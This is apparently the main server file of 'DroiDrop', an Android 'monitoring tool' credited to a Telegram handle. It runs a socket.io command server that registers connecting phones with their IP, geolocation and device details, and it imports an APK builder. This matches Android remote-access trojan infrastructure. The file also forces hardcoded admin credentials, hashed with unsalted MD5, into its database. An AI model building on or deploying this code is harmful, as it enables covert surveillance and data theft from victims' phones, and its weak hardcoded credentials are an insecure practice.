/* 
*   DroiDrop
*   An Android Monitoring Tools
*   By t.me/efxtv
*/

const express = require('express');
const app = express();
const IO = require('socket.io');
const geoip = require('geoip-lite');
const CONST = require('./includes/const');
const db = require('./includes/databaseGateway');
const logManager = require('./includes/logManager');
const ClientManager = require('./includes/clientManager');
const apkBuilder = require('./includes/apkBuilder');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ===== Force custom admin credentials =====
const dbFile = path.join(__dirname, 'maindb.json');
const customUser = 'featherops';
const customPass = 'featherops';

const adminData = {
    admin: {
        username: customUser,
        password: crypto.createHash('md5').update(customPass).digest('hex')
    }
};
fs.writeFileSync(dbFile, JSON.stringify(adminData, null, 2));
console.log(`✅ Admin credentials reset to ${customUser}/${customPass}`);
// ==========================================

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = new ClientManager(db);
global.apkBuilder = apkBuilder;

// Get the port from environment or CONST.web_port
const PORT = process.env.PORT || CONST.web_port;

// Spin up socket server on same port
const server = app.listen(PORT, () => {
    console.log(`Web & Control server running on port ${PORT}`);
});

let client_io = IO(server);

client_io.sockets.pingInterval = 30000;
client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {};

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet); // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet); // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }
});

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));
